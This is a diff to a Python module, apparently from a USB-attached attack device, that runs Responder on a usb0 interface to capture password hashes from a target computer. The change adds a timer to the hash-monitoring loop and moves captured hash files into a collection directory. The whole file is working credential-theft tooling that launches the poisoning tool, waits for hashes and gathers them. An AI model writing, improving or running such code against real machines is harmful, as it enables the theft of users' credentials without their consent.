@@ -18,29 +18,33 @@ class Responder(Debug):
         subprocess.run("mkdir -p ../hashes", shell=True)  # If the "hashes" directory doesn't exist, create it
 
     # Method used to capture password hashes from target using Spiderlabs' Responder
-    def capture(self):
+    def capture(self, timer):
         network.up()  # Up usb0
         process = subprocess.Popen("exec python ../components/modules/Responder/src/Responder.py -I usb0 -w -r -f",
                                    shell=True)  # Run Responder on usb0
-        monitor_responder()  # Call method that will determine if hashes have been captured
+        hash_success = monitor_responder(timer)  # Call method that will determine if hashes have been captured
         process.kill()  # Kill Responder
         network.down()  # Down usb0
 
         # Move txt files that contain the hashes to a more central directory (hashes directory)
-        subprocess.run("find ../components/modules/Responder/src/logs -name '*.txt' -exec mv {} ../hashes \;",
+        if hash_success:
+            subprocess.run("find ../components/modules/Responder/src/logs -name '*.txt' -exec mv {} ../hashes \;",
                        shell=True)
 
         return True
 
 
-def monitor_responder():  # "Stolen from PiKey"
+def monitor_responder(timer):  # "Stolen from PiKey"
 
     # Determine the last modified time of Responder.db
     timestamp_old = os.stat("../components/modules/Responder/src/Responder.db").st_mtime
+    time_to_run = time.time() + timer
 
-    while True:  # Infinite loop
+    while time.time() < time_to_run:  # Infinite loop
         timestamp_new = os.stat("../components/modules/Responder/src/Responder.db").st_mtime
         if timestamp_new > timestamp_old:  # if newer modification time is detected, sleep and return
             time.sleep(2)
-            return
+            return True
+
+    return False
 
